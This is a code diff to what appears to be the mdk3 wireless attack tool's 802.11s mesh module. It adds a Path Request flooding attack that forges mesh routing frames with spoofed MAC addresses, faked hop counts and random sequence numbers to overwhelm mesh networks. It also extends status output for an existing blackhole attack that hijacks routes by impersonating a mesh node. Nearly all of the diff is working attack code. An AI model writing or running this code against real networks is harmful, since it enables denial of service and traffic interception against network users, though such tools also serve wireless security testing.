@@ -18,6 +18,8 @@ struct packet action_frame_sniffer_pkt;
 pthread_mutex_t sniff_packet_mutex = PTHREAD_MUTEX_INITIALIZER;
 unsigned int incoming_action = 0;
 unsigned int incoming_beacon = 0;
+char blackhole_info[1024];
+struct ether_addr info_src, info_dst;
 
 
 struct ieee80211s_options {
@@ -49,6 +51,9 @@ void ieee80211s_longhelp()
 	  "      -b <impersonated_meshpoint>\n"
 	  "         Create a Blackhole, using the impersonated_meshpoint's MAC adress\n"
 	  "         mdk3 will answer every incoming Route Request with a perfect route over the impersonated node.\n"
+	  "      -p <impersonated_meshpoint>\n"
+	  "         Path Request Flooding using the impersonated_meshpoint's adress\n"
+	  "         Adjust the speed switch (-s) for maximum profit!\n"
 	  "      -s <pps>\n"
 	  "         Set speed in packets per second (Default: 100)\n"
 	  "      -n <meshID>\n"
@@ -64,7 +69,7 @@ void *ieee80211s_parse(int argc, char *argv[]) {
   dopt->speed = 100;
   dopt->target = NULL;
   
-  while ((opt = getopt(argc, argv, "n:f:s:b:")) != -1) {
+  while ((opt = getopt(argc, argv, "n:f:s:b:p:")) != -1) {
     switch (opt) {
       case 'f':
 	if (dopt->attack_type) { printf("Duplicate Attack type: Fuzzing\n"); return NULL; }
@@ -82,6 +87,12 @@ void *ieee80211s_parse(int argc, char *argv[]) {
 	*(dopt->target) = parse_mac(optarg);
 	dopt->attack_type = 'b';
       break;
+      case 'p':
+	if (dopt->attack_type) { printf("Duplicate Attack type: PREQ Flooding\n"); return NULL; }
+	dopt->target = malloc(sizeof(struct ether_addr));
+	*(dopt->target) = parse_mac(optarg);
+	dopt->attack_type = 'p';
+      break;      
       case 's':
 	dopt->speed = (unsigned int) atoi(optarg);
       break;
@@ -118,15 +129,6 @@ void ieee80211s_check(void *options) {
   options = options;
   //No checks yet.
 }
-
-/*  while(1) {
-    pkt = osdep_read_packet();
-    id = get_meshid(&pkt, NULL);
-    if (id) {
-      printf("MeshID found: %s\n", id);
-      free(id);
-    }
-  }*/
 
 int action_frame_sniffer_acceptpacket(struct packet sniffed) {
   pthread_mutex_lock(&sniff_packet_mutex);
@@ -254,11 +256,10 @@ struct packet do_blackhole(struct ieee80211s_options *dopt) {
     }
   }
   
-  printf("Jacked PREQ: Hops %3d TTL %3d ID %3d Originator ", preq->hop_count, preq->ttl, preq->discovery_id);
-  print_mac(preq->originator);
-  printf(" OrigSeq %5d Lifetime %5d Metric %5d Target ", preq->orig_seq, preq->lifetime, preq->metric);
-  print_mac(preq->target);
-  printf(" TargetSeq %5d\n", preq->target_seq);
+  MAC_COPY(info_dst, preq->target);
+  MAC_COPY(info_src, preq->originator);
+  snprintf(blackhole_info, 1024, "Hops %3d  TTL %3d  ID %3d  Metric %5d  SeqNo %d/%d",
+	   preq->hop_count, preq->ttl, preq->discovery_id, preq->metric, preq->orig_seq, preq->target_seq);
   
   inject.data = malloc(2048);
   src = get_source(&sniff);
@@ -286,6 +287,66 @@ struct packet do_blackhole(struct ieee80211s_options *dopt) {
   return inject;
 }
 
+struct packet do_flood(struct ieee80211s_options *dopt) {
+  struct packet inject;
+  struct action_fixed *act;
+  struct mesh_preq *preq;
+  struct ether_addr bcast;
+  static uint32_t id = 0;
+  static uint32_t seq = 0;
+  uint8_t hops;
+  uint32_t tseq;
+  
+  MAC_SET_BCAST(bcast);
+  
+  inject.data = malloc(2048);
+  create_ieee_hdr(&inject, IEEE80211_TYPE_ACTION, 'a', AUTH_DEFAULT_DURATION, bcast, *(dopt->target), *(dopt->target), bcast, 0);
+
+  act = (struct action_fixed *) (inject.data + sizeof(struct ieee_hdr));
+  inject.len += sizeof(struct action_fixed);
+  act->category = MESH_ACTION_CATEGORY;
+  act->action_code = MESH_ACTION_PATHSEL;
+  act->tag = MESH_TAG_PREQ;
+  act->taglen = 37;
+  
+  //Setting up values
+  hops = (random() % 10) + 1; //Plus one so it looks like we just forwarded it ;)
+  id++;
+  seq += (random() % 10); //Randomly increasing sequence counter
+  tseq = seq + ((random() % 50) - 25); //Setting target seq somewhere near orig seq
+  
+  preq = (struct mesh_preq *) (inject.data + sizeof(struct ieee_hdr) + sizeof(struct action_fixed));
+  inject.len += sizeof(struct mesh_preq);
+/*struct mesh_preq {
+  uint8_t flags;
+  uint8_t hop_count;
+  uint8_t ttl;
+  uint32_t discovery_id;
+  struct ether_addr originator;
+  uint32_t orig_seq;
+  uint32_t lifetime;
+  uint32_t metric;
+  uint8_t target_count;
+  uint8_t target_flags;
+  struct ether_addr target;
+  uint32_t target_seq;
+} __attribute__((packed));*/
+  preq->flags = 0x00;
+  preq->hop_count = hops;
+  preq->ttl = 31 - hops;
+  preq->discovery_id = id;
+  preq->originator = generate_mac(MAC_KIND_CLIENT);
+  preq->orig_seq = seq;
+  preq->lifetime = 4882; //default?
+  preq->metric = random() % 4096;
+  preq->target_count = 1; //thats enough for now ;)
+  preq->target_flags = 0x02; //wireshark said so
+  preq->target = generate_mac(MAC_KIND_CLIENT);
+  preq->target_seq = tseq;
+  
+  return inject;
+}
+
 struct packet ieee80211s_getpacket(void *options) {
   struct ieee80211s_options *dopt = (struct ieee80211s_options *) options;
   struct packet pkt;
@@ -299,6 +360,9 @@ struct packet ieee80211s_getpacket(void *options) {
     case 'b':
       pkt = do_blackhole(dopt);
     break;
+    case 'p':
+      pkt = do_flood(dopt);
+    break;
     default:
       printf("BUG! Unknown attack type %c\n", dopt->attack_type);
       pkt.len = 0; pkt.data = NULL;
@@ -310,8 +374,17 @@ struct packet ieee80211s_getpacket(void *options) {
 void ieee80211s_stats(void *options) {
   struct ieee80211s_options *dopt = (struct ieee80211s_options *) options;
   
-  if (dopt->attack_type == 'f') {
-    printf("\rReceived Action frames: %5d  Received Mesh Beacons:  %5d                    \n", incoming_action, incoming_beacon);
+  switch (dopt->attack_type) {
+    case 'f':
+      printf("\rReceived Action frames: %5d  Received Mesh Beacons:  %5d                    \n", incoming_action, incoming_beacon);
+    break;
+    case 'b':
+      printf("\rLast PREQ: ");
+      print_mac(info_src);
+      printf(" searching for ");
+      print_mac(info_dst);
+      printf(": %s\n", blackhole_info);
+    break;
   }
 }
 
